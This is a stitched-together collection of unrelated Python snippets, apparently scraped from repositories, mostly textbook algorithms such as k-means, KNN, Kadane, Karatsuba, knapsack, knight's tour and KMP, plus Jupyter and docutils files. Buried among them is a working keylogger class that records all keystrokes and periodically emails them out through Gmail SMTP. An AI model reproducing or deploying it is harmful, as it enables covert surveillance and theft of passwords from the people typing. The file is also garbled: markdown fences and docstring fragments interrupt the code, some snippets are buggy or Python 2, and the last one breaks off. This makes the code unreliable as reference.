        :type nums: List[int]
        :type k: int
        :rtype: int
        """
        if k < 0:
            return 0

        nums.sort()
        dict = {}

        for item in nums:
            if item in dict:
                dict[item] += 1
            else:
                dict[item] = 1

        pre, ans = None, 0
        for item in nums:
            if item == pre:
                continue
            dict[item] -= 1
            target = item + k
            if target in dict and dict[target] > 0:
                ans += 1
            pre = item

        return ans

import matplotlib.pyplot as plt
import seaborn as sns

sns.set()  # for plot styling
import numpy as np

from sklearn.datasets.samples_generator import make_blobs

X, y_true = make_blobs(n_samples=300, centers=4, cluster_std=0.60, random_state=0)
plt.scatter(X[:, 0], X[:, 1], s=50)

# Use the sklearn KMeans
from sklearn.cluster import KMeans

kmeans = KMeans(n_clusters=4)
kmeans.fit(X)
y_kmeans = kmeans.predict(X)


# Implement from scratch
from sklearn.metrics import pairwise_distances_argmin


def find_clusters(X, n_clusters, rseed=2):
    # randomly choose clusters
    rng = np.random.RandomState(rseed)
    i = rng.permutation(X.shape[0])[:n_clusters]
    centers = X[i]

    while True:
        labels = pairwise_distances_argmin(X, centers)
        new_centers = np.array(X[labels == i].mean(0) for i in range(n_clusters))
        if np.all(new_centers == centers):
            break
        centers = new_centers
    return centers, labels


def kmeans(X, n_cluster, rseed):
    rng = np.random.RandomState(rseed)
    i = rng.permutation(X)[:n_cluster]
    centers = X[i]

    while True:
        labels = pairwise_distances_argmin(X, centers)
        new_centers = np.array(X[labels == i].mean(0) for i in range(new_centers))
        if centers == new_centers:
            break
        centers = new_centers
    return centers, labels

from collections import Counter

import numpy as np
from sklearn import datasets
from sklearn.model_selection import train_test_split

data = datasets.load_iris()

X = np.array(data["data"])
y = np.array(data["target"])
classes = data["target_names"]

X_train, X_test, y_train, y_test = train_test_split(X, y)


def euclidean_distance(a, b):
    """
    Gives the euclidean distance between two points
    >>> euclidean_distance([0, 0], [3, 4])
    5.0
    >>> euclidean_distance([1, 2, 3], [1, 8, 11])
    10.0
    """
    return np.linalg.norm(np.array(a) - np.array(b))


def classifier(train_data, train_target, classes, point, k=5):
    """
    Classifies the point using the KNN algorithm
    k closest points are found (ranked in ascending order of euclidean distance)
    Params:
    :train_data: Set of points that are classified into two or more classes
    :train_target: List of classes in the order of train_data points
    :classes: Labels of the classes
    :point: The data point that needs to be classified

    >>> X_train = [[0, 0], [1, 0], [0, 1], [0.5, 0.5], [3, 3], [2, 3], [3, 2]]
    >>> y_train = [0, 0, 0, 0, 1, 1, 1]
    >>> classes = ['A','B']; point = [1.2,1.2]
    >>> classifier(X_train, y_train, classes,point)
    'A'
    """
    data = zip(train_data, train_target)
    # List of distances of all points from the point to be classified
    distances = []
    for data_point in data:
        distance = euclidean_distance(data_point[0], point)
        distances.append((distance, data_point[1]))
    # Choosing 'k' points with the least distances.
    votes = [i[1] for i in sorted(distances)[:k]]
    # Most commonly occurring class among them
    # is the class into which the point is classified
    result = Counter(votes).most_common(1)[0][0]
    return classes[result]


if __name__ == "__main__":
    print(classifier(X_train, y_train, classes, [4.4, 3.1, 1.3, 1.4]))
````

````py
Kadane's algorithm to get maximum subarray sum
https://medium.com/@rsinghal757/kadanes-algorithm-dynamic-programming-how-and-why-does-it-work-3fd8849ed73d
https://en.wikipedia.org/wiki/Maximum_subarray_problem```


```py
test_data: tuple = ([-2, -8, -9], [2, 8, 9], [-1, 0, 1], [0, 0], [])


def negative_exist(arr: list) -> int:
    """
    >>> negative_exist([-2,-8,-9])
    -2
    >>> [negative_exist(arr) for arr in test_data]
    [-2, 0, 0, 0, 0]
    """
    arr = arr or [0]
    max = arr[0]
    for i in arr:
        if i >= 0:
            return 0
        elif max <= i:
            max = i
    return max


def kadanes(arr: list) -> int:
    """
    If negative_exist() returns 0 than this function will execute
    else it will return the value return by negative_exist function

    For example: arr = [2, 3, -9, 8, -2]
        Initially we set value of max_sum to 0 and max_till_element to 0 than when
        max_sum is less than max_till particular element it will assign that value to
        max_sum and when value of max_till_sum is less than 0 it will assign 0 to i
        and after that whole process, return the max_sum
    So the output for above arr is 8

    >>> kadanes([2, 3, -9, 8, -2])
    8
    >>> [kadanes(arr) for arr in test_data]
    [-2, 19, 1, 0, 0]
    """
    max_sum = negative_exist(arr)
    if max_sum < 0:
        return max_sum

    max_sum = 0
    max_till_element = 0

    for i in arr:
        max_till_element += i
        if max_sum <= max_till_element:
            max_sum = max_till_element
        if max_till_element < 0:
            max_till_element = 0
    return max_sum


if __name__ == "__main__":
    try:
        print("Enter integer values sepatated by spaces")
        arr = [int(x) for x in input().split()]
        print(f"Maximum subarray sum of {arr} is {kadanes(arr)}")
    except ValueError:
        print("Please enter integer values.")

# Finding longest distance in Directed Acyclic Graph using KahnsAlgorithm
def longestDistance(graph):
    indegree = [0] * len(graph)
    queue = []
    longDist = [1] * len(graph)

    for key, values in graph.items():
        for i in values:
            indegree[i] += 1

    for i in range(len(indegree)):
        if indegree[i] == 0:
            queue.append(i)

    while queue:
        vertex = queue.pop(0)
        for x in graph[vertex]:
            indegree[x] -= 1

            if longDist[vertex] + 1 > longDist[x]:
                longDist[x] = longDist[vertex] + 1

            if indegree[x] == 0:
                queue.append(x)

    print(max(longDist))


# Adjacency list of Graph
graph = {0: [2, 3, 4], 1: [2, 7], 2: [5], 3: [5, 7], 4: [7], 5: [6], 6: [7], 7: []}
longestDistance(graph)

def topologicalSort(graph):
    """
    Kahn's Algorithm is used to find Topological ordering of Directed Acyclic Graph
    using BFS
    """
    indegree = [0] * len(graph)
    queue = []
    topo = []
    cnt = 0

    for key, values in graph.items():
        for i in values:
            indegree[i] += 1

    for i in range(len(indegree)):
        if indegree[i] == 0:
            queue.append(i)

    while queue:
        vertex = queue.pop(0)
        cnt += 1
        topo.append(vertex)
        for x in graph[vertex]:
            indegree[x] -= 1
            if indegree[x] == 0:
                queue.append(x)

    if cnt != len(graph):
        print("Cycle exists")
    else:
        print(topo)


# Adjacency List of Graph
graph = {0: [1, 2], 1: [3], 2: [3], 3: [4, 5], 4: [], 5: []}
topologicalSort(graph)
````

```py Multiply two numbers using Karatsuba algorithm """


def karatsuba(a, b):
    """
    >>> karatsuba(15463, 23489) == 15463 * 23489
    True
    >>> karatsuba(3, 9) == 3 * 9
    True
    """
    if len(str(a)) == 1 or len(str(b)) == 1:
        return a * b
    else:
        m1 = max(len(str(a)), len(str(b)))
        m2 = m1 // 2

        a1, a2 = divmod(a, 10 ** m2)
        b1, b2 = divmod(b, 10 ** m2)

        x = karatsuba(a2, b2)
        y = karatsuba((a1 + a2), (b1 + b2))
        z = karatsuba(a1, b1)

        return (z * 10 ** (2 * m2)) + ((y - z - x) * 10 ** (m2)) + (x)


def main():
    print(karatsuba(15463, 23489))


if __name__ == "__main__":
    main()
```

````py
An implementation of Karger's Algorithm for partitioning a graph.```


```py

from __future__ import annotations

import random

# Adjacency list representation of this graph:
# https://en.wikipedia.org/wiki/File:Single_run_of_Karger%E2%80%99s_Mincut_algorithm.svg
TEST_GRAPH = {
    "1": ["2", "3", "4", "5"],
    "2": ["1", "3", "4", "5"],
    "3": ["1", "2", "4", "5", "10"],
    "4": ["1", "2", "3", "5", "6"],
    "5": ["1", "2", "3", "4", "7"],
    "6": ["7", "8", "9", "10", "4"],
    "7": ["6", "8", "9", "10", "5"],
    "8": ["6", "7", "9", "10"],
    "9": ["6", "7", "8", "10"],
    "10": ["6", "7", "8", "9", "3"],
}


def partition_graph(graph: dict[str, list[str]]) -> set[tuple[str, str]]:
    """
    Partitions a graph using Karger's Algorithm. Implemented from
    pseudocode found here:
    https://en.wikipedia.org/wiki/Karger%27s_algorithm.
    This function involves random choices, meaning it will not give
    consistent outputs.

    Args:
        graph: A dictionary containing adacency lists for the graph.
            Nodes must be strings.

    Returns:
        The cutset of the cut found by Karger's Algorithm.

    >>> graph = {'0':['1'], '1':['0']}
    >>> partition_graph(graph)
    {('0', '1')}
    """
    # Dict that maps contracted nodes to a list of all the nodes it "contains."
    contracted_nodes = {node: {node} for node in graph}

    graph_copy = {node: graph[node][:] for node in graph}

    while len(graph_copy) > 2:

        # Choose a random edge.
        u = random.choice(list(graph_copy.keys()))
        v = random.choice(graph_copy[u])

        # Contract edge (u, v) to new node uv
        uv = u + v
        uv_neighbors = list(set(graph_copy[u] + graph_copy[v]))
        uv_neighbors.remove(u)
        uv_neighbors.remove(v)
        graph_copy[uv] = uv_neighbors
        for neighbor in uv_neighbors:
            graph_copy[neighbor].append(uv)

        contracted_nodes[uv] = set(contracted_nodes[u].union(contracted_nodes[v]))

        # Remove nodes u and v.
        del graph_copy[u]
        del graph_copy[v]
        for neighbor in uv_neighbors:
            if u in graph_copy[neighbor]:
                graph_copy[neighbor].remove(u)
            if v in graph_copy[neighbor]:
                graph_copy[neighbor].remove(v)

    # Find cutset.
    groups = [contracted_nodes[node] for node in graph_copy]
    return {
        (node, neighbor)
        for node in groups[0]
        for neighbor in graph[node]
        if neighbor in groups[1]
    }


if __name__ == "__main__":
    print(partition_graph(TEST_GRAPH))
````

````py
This sort is same as reverse sort by me.
Except minor changes in first for loop, and
comparison sign on line 11
And function is called kay_sort because
kay is my nickname```


```py

def kay_sort(array):
 print "Orignal List : {}".format(array)
 for i in range(len(array)):
  for n in range(len(array) - 1):
   a = array[n]
   if (a > array[i]):
    tem = array[i]
    array[i] = a
    array[n] = tem
 return "Sorted List : {}".format(array)

print kay_sort([123, 4, 123, 4])
````

```pyDefines a KernelManager that provides signals and slots."""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from qtpy import QtCore

from traitlets import HasTraits, Type
from .util import MetaQObjectHasTraits, SuperQObject
from .comms import CommManager


class QtKernelRestarterMixin(
    MetaQObjectHasTraits("NewBase", (HasTraits, SuperQObject), {})
):

    _timer = None


class QtKernelManagerMixin(
    MetaQObjectHasTraits("NewBase", (HasTraits, SuperQObject), {})
):
    """ A KernelClient that provides signals and slots.
    """

    kernel_restarted = QtCore.Signal()


class QtKernelClientMixin(
    MetaQObjectHasTraits("NewBase", (HasTraits, SuperQObject), {})
):
    """ A KernelClient that provides signals and slots.
    """

    # Emitted when the kernel client has started listening.
    started_channels = QtCore.Signal()

    # Emitted when the kernel client has stopped listening.
    stopped_channels = QtCore.Signal()

    # ---------------------------------------------------------------------------
    # 'KernelClient' interface
    # ---------------------------------------------------------------------------

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.comm_manager = None

    # ------ Channel management -------------------------------------------------

    def start_channels(self, *args, **kw):
        """ Reimplemented to emit signal.
        """
        super().start_channels(*args, **kw)
        self.started_channels.emit()
        self.comm_manager = CommManager(parent=self, kernel_client=self)

    def stop_channels(self):
        """ Reimplemented to emit signal.
        """
        super().stop_channels()
        self.stopped_channels.emit()
        self.comm_manager = None

import os
import signal
import uuid

from jupyter_core.application import base_flags  # type: ignore
from jupyter_core.application import JupyterApp
from tornado.ioloop import IOLoop
from traitlets import Unicode  # type: ignore

from . import __version__
from .kernelspec import KernelSpecManager
from .kernelspec import NATIVE_KERNEL_NAME
from .manager import KernelManager


class KernelApp(JupyterApp):
    """Launch a kernel by name in a local subprocess."""

    version = __version__
    description = "Run a kernel locally in a subprocess"

    classes = [KernelManager, KernelSpecManager]

    aliases = {"kernel": "KernelApp.kernel_name", "ip": "KernelManager.ip"}
    flags = {"debug": base_flags["debug"]}

    kernel_name = Unicode(
        NATIVE_KERNEL_NAME, help="The name of a kernel type to start"
    ).tag(config=True)

    def initialize(self, argv=None):
        super().initialize(argv)

        cf_basename = "kernel-%s.json" % uuid.uuid4()
        self.config.setdefault("KernelManager", {}).setdefault(
            "connection_file", os.path.join(self.runtime_dir, cf_basename)
        )
        self.km = KernelManager(kernel_name=self.kernel_name, config=self.config)

        self.loop = IOLoop.current()
        self.loop.add_callback(self._record_started)

    def setup_signals(self) -> None:
        """Shutdown on SIGTERM or SIGINT (Ctrl-C)"""
        if os.name == "nt":
            return

        def shutdown_handler(signo, frame):
            self.loop.add_callback_from_signal(self.shutdown, signo)

        for sig in [signal.SIGTERM, signal.SIGINT]:
            signal.signal(sig, shutdown_handler)

    def shutdown(self, signo: int) -> None:
        self.log.info("Shutting down on signal %d" % signo)
        self.km.shutdown_kernel()
        self.loop.stop()

    def log_connection_info(self) -> None:
        cf = self.km.connection_file
        self.log.info("Connection file: %s", cf)
        self.log.info("To connect a client: --existing %s", os.path.basename(cf))

    def _record_started(self) -> None:
        """For tests, create a file to indicate that we've started

        Do not rely on this except in our own tests!
        """
        fn = os.environ.get("JUPYTER_CLIENT_TEST_RECORD_STARTUP_PRIVATE")
        if fn is not None:
            with open(fn, "wb"):
                pass

    def start(self) -> None:
        self.log.info("Starting kernel %r", self.kernel_name)
        try:
            self.km.start_kernel()
            self.log_connection_info()
            self.setup_signals()
            self.loop.start()
        finally:
            self.km.cleanup_resources()


main = KernelApp.launch_instance

import pynput.keyboard
import threading
import smtplib

log = ""


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        # print (self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Checking is some keyword is a python keyword or not
import keyword

pythonKeywords = keyword.kwlist
getToCheck = str(input("Keyword to check : "))
check = keyword.iskeyword(getToCheck)
if check == True:
    print(getToCheck + " is a python keyword.")
else:
    print(getToCheck + " is not a python keyword.")

print("\nShowing all keywords in python : \n")
print(pythonKeywords)
# remember to test the code

import py
import os, sys

if sys.platform == "win32" or getattr(os, '_name', '') == 'nt':
    try:
        import ctypes
    except ImportError:
        def dokill(pid):
            py.process.cmdexec("taskkill /F /PID %d" %(pid,))
    else:
        def dokill(pid):
            PROCESS_TERMINATE = 1
            handle = ctypes.windll.kernel32.OpenProcess(
                        PROCESS_TERMINATE, False, pid)
            ctypes.windll.kernel32.TerminateProcess(handle, -1)
            ctypes.windll.kernel32.CloseHandle(handle)
else:
    def dokill(pid):
        os.kill(pid, 15)

def kill(pid):
    """ kill process by id. """
    dokill(pid)

#!/usr/bin/python

import sys
from collections import namedtuple

Item = namedtuple("Item", ["index", "size", "value"])


def knapsack_solver(items, capacity):
    pass


if __name__ == "__main__":
    if len(sys.argv) > 1:
        capacity = int(sys.argv[2])
        file_location = sys.argv[1].strip()
        file_contents = open(file_location, "r")
        items = []

        for line in file_contents.readlines():
            data = line.rstrip().split()
            items.append(Item(int(data[0]), int(data[1]), int(data[2])))

        file_contents.close()
        print(knapsack_solver(items, capacity))
    else:
        print("Usage: knapsack.py [filename] [capacity]")

def knapsackLight(value1, weight1, value2, weight2, maxW):
    val = 0
    if value2 > value1:
        val = value1
        value1 = value2
        value2 = val
        val = weight1
        weight1 = weight2
        weight2 = val

    val = 0
    if weight1 <= maxW:
        val += value1
        maxW -= weight1

    if weight2 <= maxW:
        val += value2

    return val
```

````py
ID: a01ea147-459f-43c0-8f14-ec50aedd1fa9
https://en.wikipedia.org/wiki/Knapsack_problem#0-1_knapsack_problem
Grokking Algorithms, Page 161
Python Algorithms, Page 143
There are many versions of the knapsack problem. This is one of the simplest that still benefits from
 some form of dynamic programming.
Iterative dynamic programming usually means making a matrix of previous calculations and sub-calculations.
If you only need to access the very last round of calculations (like this problem) you can just use a list.```


```py
from typing import Sequence


def knapsack_simple(weights: Sequence[int], values: Sequence[int], capacity: int):
    """0-1 knapsack problem. Just return the max value."""
    # Each index is a sub-capacity and each value the best value for that sub-capacity so far.
    best_values = [0] * (capacity + 1)
    for weight, value in zip(weights, values):
        # Iterate backwards so we don't take things twice. Forwards would be the unbounded version of the problem.
        for sub_capacity in range(capacity, 0, -1):
            if weight <= sub_capacity:
                # These three lines can be refactored to one, or a slightly more efficient if instead of max.
                take_value = value + best_values[sub_capacity - weight]
                non_take_value = best_values[sub_capacity]
                best_values[sub_capacity] = max(take_value, non_take_value)
    return best_values[-1]
````

````py
Aim: To check whether it is possible for a Knight to visit each
         cell of the N*N chessboard without visiting any cell
         twice starting from (X, Y) position.
Intution: To visit each and every positions which are available from
          the current position and recursively repeat this until
          all the cells are covered.
        ```


```py

from time import time


def move_Knight(n, pos, move, ans, step):
    x, y = pos

    # Base Case
    if step == n * n:
        return ans
    for i in move:
        r = x + i[0]
        c = y + i[1]
        if 0 <= r < n and 0 <= c < n and not ans[r][c]:
            ans[r][c] = step + 1
            temp = move_Knight(n, (r, c), move, ans, step + 1)
            if temp is not False:
                return temp
            ans[r][c] = 0
    return False


def Knight_Tour(n, pos):
    x, y = pos

    # All valid moves that a Knight can make
    move = [[2, 1], [2, -1], [-2, 1], [-2, -1], [1, 2], [1, -2], [-1, 2], [-1, -2]]

    # To keep a track of already visited cells and
    # Answer Matrix
    answer = [[0] * n for i in range(n)]

    # To mark (X, Y) cell as visited
    answer[x][y] = 1

    return move_Knight(n, pos, move, answer, 1)


# ------------------------DRIVER CODE ------------------------

if __name__ == "__main__":

    # Input the initial Position of the Knight
    N = int(input("Enter the size of the Chessboard: "))
    X, Y = map(int, input("Enter Initial Position of the Knight: ").split())
    start = time()
    ans_mat = Knight_Tour(N, (X - 1, Y - 1))
    if ans_mat is False:
        print("Knight's Tour form the given initial position is not possible")
    else:
        print("The desired Knight's Tour :")
        for i in ans_mat:
            print("\t\t", *i)
    print("Time taken: ", time() - start)
````

```py
Sample Working:

Enter the size of the Chessboard: 5
Enter the Initial Position of the Knight: 1 1
The desired Knight's Tour :
                1 6 15 10 21
                14 9 20 5 16
                19 2 7 22 11
                8 13 24 17 4
                25 18 3 12 23
Time taken:  0.10171318054199219
```

```py

# Knight Tour Intro: https://www.youtube.com/watch?v=ab_dY3dZFHM

from typing import List, Tuple


def get_valid_pos(position: Tuple[int, int], n: int) -> List[Tuple[int, int]]:
    """
    Find all the valid positions a knight can move to from the current position.

    >>> get_valid_pos((1, 3), 4)
    [(2, 1), (0, 1), (3, 2)]
    """

    y, x = position
    positions = [
        (y + 1, x + 2),
        (y - 1, x + 2),
        (y + 1, x - 2),
        (y - 1, x - 2),
        (y + 2, x + 1),
        (y + 2, x - 1),
        (y - 2, x + 1),
        (y - 2, x - 1),
    ]
    permissible_positions = []

    for position in positions:
        y_test, x_test = position
        if 0 <= y_test < n and 0 <= x_test < n:
            permissible_positions.append(position)

    return permissible_positions


def is_complete(board: List[List[int]]) -> bool:
    """
    Check if the board (matrix) has been completely filled with non-zero values.

    >>> is_complete([[1]])
    True

    >>> is_complete([[1, 2], [3, 0]])
    False
    """

    return not any(elem == 0 for row in board for elem in row)


def open_knight_tour_helper(
    board: List[List[int]], pos: Tuple[int, int], curr: int
) -> bool:
    """
    Helper function to solve knight tour problem.
    """

    if is_complete(board):
        return True

    for position in get_valid_pos(pos, len(board)):
        y, x = position

        if board[y][x] == 0:
            board[y][x] = curr + 1
            if open_knight_tour_helper(board, position, curr + 1):
                return True
            board[y][x] = 0

    return False


def open_knight_tour(n: int) -> List[List[int]]:
    """
    Find the solution for the knight tour problem for a board of size n. Raises
    ValueError if the tour cannot be performed for the given size.

    >>> open_knight_tour(1)
    [[1]]

    >>> open_knight_tour(2)
    Traceback (most recent call last):
    ...
    ValueError: Open Kight Tour cannot be performed on a board of size 2
    """

    board = [[0 for i in range(n)] for j in range(n)]

    for i in range(n):
        for j in range(n):
            board[i][j] = 1
            if open_knight_tour_helper(board, (i, j), 1):
                return board
            board[i][j] = 0

    raise ValueError(f"Open Kight Tour cannot be performed on a board of size {n}")


if __name__ == "__main__":
    import doctest

    doctest.testmod()

from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split
from sklearn.neighbors import KNeighborsClassifier

# Load iris file
iris = load_iris()
iris.keys()


print(f"Target names: \n {iris.target_names} ")
print(f"\n Features: \n {iris.feature_names}")

# Train set e Test set
X_train, X_test, y_train, y_test = train_test_split(
    iris["data"], iris["target"], random_state=4
)

# KNN

knn = KNeighborsClassifier(n_neighbors=1)
knn.fit(X_train, y_train)

# new array to test
X_new = [[1, 2, 1, 4], [2, 3, 4, 5]]

prediction = knn.predict(X_new)

print(
    f"\nNew array: \n {X_new}\n\nTarget Names Prediction: \n"
    f" {iris['target_names'][prediction]}"
)

def kmp(pattern, text):
    """
    The Knuth-Morris-Pratt Algorithm for finding a pattern within a piece of text
    with complexity O(n + m)

    1) Preprocess pattern to identify any suffixes that are identical to prefixes

        This tells us where to continue from if we get a mismatch between a character in our pattern
        and the text.

    2) Step through the text one character at a time and compare it to a character in the pattern
        updating our location within the pattern if necessary

    """

    # 1) Construct the failure array
    failure = get_failure_array(pattern)

    # 2) Step through text searching for pattern
    i, j = 0, 0  # index into text, pattern
    while i < len(text):
        if pattern[j] == text[i]:
            if j == (len(pattern) - 1):
                return True
            j += 1

        # if this is a prefix in our pattern
        # just go back far enough to continue
        elif j > 0:
            j = failure[j - 1]
            continue
        i += 1
    return False


def get_failure_array(pattern):
    """
    Calculates the new index we should go to if we fail a comparison
    :param pattern:
    :return:
    """
    failure = [0]
    i = 0
    j = 1
    while j < len(pattern):
        if pattern[i] == pattern[j]:
            i += 1
        elif i > 0:
            i = failure[i - 1]
            continue
        j += 1
        failure.append(i)
    return failure


if __name__ == "__main__":
    # Test 1)
    pattern = "abc1abc12"
    text1 = "alskfjaldsabc1abc1abc12k23adsfabcabc"
    text2 = "alskfjaldsk23adsfabcabc"
    assert kmp(pattern, text1) and not kmp(pattern, text2)

    # Test 2)
    pattern = "ABABX"
    text = "ABABZABABYABABX"
    assert kmp(pattern, text)

    # Test 3)
    pattern = "AAAB"
    text = "ABAAAAAB"
    assert kmp(pattern, text)

    # Test 4)
    pattern = "abcdabcy"
    text = "abcxabcdabxabcdabcdabcy"
    assert kmp(pattern, text)

    # Test 5)
    pattern = "aabaabaaa"
    assert get_failure_array(pattern) == [0, 1, 0, 1, 2, 3, 4, 5, 2]

from typing import List


def kmp(pattern: str, text: str) -> bool:
    """
    The Knuth-Morris-Pratt Algorithm for finding a pattern within a piece of text
    with complexity O(n + m)

    1) Preprocess pattern to identify any suffixes that are identical to prefixes

        This tells us where to continue from if we get a mismatch between a character
        in our pattern and the text.

    2) Step through the text one character at a time and compare it to a character in
        the pattern updating our location within the pattern if necessary

    """

    # 1) Construct the failure array
    failure = get_failure_array(pattern)

    # 2) Step through text searching for pattern
    i, j = 0, 0  # index into text, pattern
    while i < len(text):
        if pattern[j] == text[i]:
            if j == (len(pattern) - 1):
                return True
            j += 1

        # if this is a prefix in our pattern
        # just go back far enough to continue
        elif j > 0:
            j = failure[j - 1]
            continue
        i += 1
    return False


def get_failure_array(pattern: str) -> List[int]:
    """
    Calculates the new index we should go to if we fail a comparison
    :param pattern:
    :return:
    """
    failure = [0]
    i = 0
    j = 1
    while j < len(pattern):
        if pattern[i] == pattern[j]:
            i += 1
        elif i > 0:
            i = failure[i - 1]
            continue
        j += 1
        failure.append(i)
    return failure


if __name__ == "__main__":
    # Test 1)
    pattern = "abc1abc12"
    text1 = "alskfjaldsabc1abc1abc12k23adsfabcabc"
    text2 = "alskfjaldsk23adsfabcabc"
    assert kmp(pattern, text1) and not kmp(pattern, text2)

    # Test 2)
    pattern = "ABABX"
    text = "ABABZABABYABABX"
    assert kmp(pattern, text)

    # Test 3)
    pattern = "AAAB"
    text = "ABAAAAAB"
    assert kmp(pattern, text)

    # Test 4)
    pattern = "abcdabcy"
    text = "abcxabcdabxabcdabcdabcy"
    assert kmp(pattern, text)

    # Test 5)
    pattern = "aabaabaaa"
    assert get_failure_array(pattern) == [0, 1, 0, 1, 2, 3, 4, 5, 2]

# -*- coding: utf-8 -*-
# $Id: ko.py 8541 2020-08-22 22:16:25Z milde $
# Author: Thomas SJ Kang <thomas.kangsj@ujuc.kr>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
```

````py
Korean-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    # fixed: language-dependent
    "author": u"저자",
    "authors": u"저자들",
    "organization": u"조직",
    "address": u"주소",
    "contact": u"연락처",
    "version": u"버전",
    "revision": u"리비전",
    "status": u"상태",
    "date": u"날짜",
    "copyright": u"저작권",
    "dedication": u"헌정",
    "abstract": u"요약",
    "attention": u"집중!",
    "caution": u"주의!",
    "danger": u"!위험!",
    "error": u"오류",
    "hint": u"실마리",
    "important": u"중요한",
    "note": u"비고",
    "tip": u"팁",
    "warning": u"경고",
    "contents": u"목차",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # language-dependent: fixed
    u"저자": "author",
    u"저자들": "authors",
    u"조직": "organization",
    u"주소": "address",
    u"연락처": "contact",
    u"버전": "version",
    u"리비전": "revision",
    u"상태": "status",
    u"날짜": "date",
    u"저작권": "copyright",
    u"헌정": "dedication",
    u"요약": "abstract",
}```


```pyKorean to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""
````

````py
 == Krishnamurthy Number ==
It is also known as Peterson Number
A Krishnamurthy Number is a number whose sum of the
factorial of the digits equals to the original
number itself.

For example: 145 = 1! + 4! + 5!
    So, 145 is a Krishnamurthy Number```


```py


def factorial(digit: int) -> int:
    """
    >>> factorial(3)
    6
    >>> factorial(0)
    1
    >>> factorial(5)
    120
    """

    return 1 if digit in (0, 1) else (digit * factorial(digit - 1))


def krishnamurthy(number: int) -> bool:
    """
    >>> krishnamurthy(145)
    True
    >>> krishnamurthy(240)
    False
    >>> krishnamurthy(1)
    True
    """

    factSum = 0
    duplicate = number
    while duplicate > 0:
        duplicate, digit = divmod(duplicate, 10)
        factSum += factorial(digit)
    return factSum == number


if __name__ == "__main__":
    print("Program to check whether a number is a Krisnamurthy Number or not.")
    number = int(input("Enter number: ").strip())
    print(
        f"{number} is {'' if krishnamurthy(number) else 'not '}a Krishnamurthy Number."
    )

#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None
def kthSmallestInBST(t, k):
    def inorder(r):
        return inorder(r.left) + [r.value] + inorder(r.right) if r else []

    return inorder(t)[k - 1]

def kth_array(arr, n):
    arr.sort(reverse=True)

    for i in range(n):
        print(arr[i])


arr = [1, 23, 12, 9, 30, 2, 50]

kth_array(arr, 3)

import heapq


class Solution:
    def klargest(self, nums, k):
        heap = []
        for num in nums:
            heapq.heappush(heap, num)
            if len(heap) > k:
                heapq.heappop(heap)
        return heap[0]


if __name__ == "__main__":
    arr = [3, 2, 3, 1, 2, 4, 5, 5, 6]
    arr.sort()
    print(arr)
    nums = [3, 2, 3, 1, 2, 4, 5, 5, 6]
    k = 4
    print(Solution().klargest(nums, k))

def kthPermutation(k, n):
    """
    Finds k'th lexicographic permutation (in increasing order) of
    0,1,2,...n-1 in O(n^2) time.

    Examples:
    First permutation is always 0,1,2,...n
    >>> kthPermutation(0,5)
    [0, 1, 2, 3, 4]

    The order of permutation of 0,1,2,3 is [0,1,2,3], [0,1,3,2], [0,2,1,3],
    [0,2,3,1], [0,3,1,2], [0,3,2,1], [1,0,2,3], [1,0,3,2], [1,2,0,3],
    [1,2,3,0], [1,3,0,2]
    >>> kthPermutation(10,4)
    [1, 3, 0, 2]
    """
    # Factorails from 1! to (n-1)!
    factorials = [1]
    for i in range(2, n):
        factorials.append(factorials[-1] * i)
    assert 0 <= k < factorials[-1] * n, "k out of bounds"

    permutation = []
    elements = list(range(n))

    # Find permutation
    while factorials:
        factorial = factorials.pop()
        number, k = divmod(k, factorial)
        permutation.append(elements[number])
        elements.remove(elements[number])
    permutation.append(elements[0])

    return permutation


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Find the kth smallest element in linear time using divide and conquer.
Recall we can do this trivially in O(nlogn) time. Sort the list and
access kth element in constant time.

This is a divide and conquer algorithm that can find a solution in O(n) time.

For more information of this algorithm:
https://web.stanford.edu/class/archive/cs/cs161/cs161.1138/lectures/08/Small08.pdf```


```py
from random import choice
from typing import List


def random_pivot(lst):
    """
    Choose a random pivot for the list.
    We can use a more sophisticated algorithm here, such as the median-of-medians
    algorithm.
    """
    return choice(lst)


def kth_number(lst: List[int], k: int) -> int:
    """
    Return the kth smallest number in lst.
    >>> kth_number([2, 1, 3, 4, 5], 3)
    3
    >>> kth_number([2, 1, 3, 4, 5], 1)
    1
    >>> kth_number([2, 1, 3, 4, 5], 5)
    5
    >>> kth_number([3, 2, 5, 6, 7, 8], 2)
    3
    >>> kth_number([25, 21, 98, 100, 76, 22, 43, 60, 89, 87], 4)
    43
    """
    # pick a pivot and separate into list based on pivot.
    pivot = random_pivot(lst)

    # partition based on pivot
    # linear time
    small = [e for e in lst if e < pivot]
    big = [e for e in lst if e > pivot]

    # if we get lucky, pivot might be the element we want.
    # we can easily see this:
    # small (elements smaller than k)
    # + pivot (kth element)
    # + big (elements larger than k)
    if len(small) == k - 1:
        return pivot
    # pivot is in elements bigger than k
    elif len(small) < k - 1:
        return kth_number(big, k - len(small) - 1)
    # pivot is in elements smaller than k
    else:
        return kth_number(small, k)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

class Solution(object):
    def topKFrequent(self, nums, k):
        number_frequency = {}
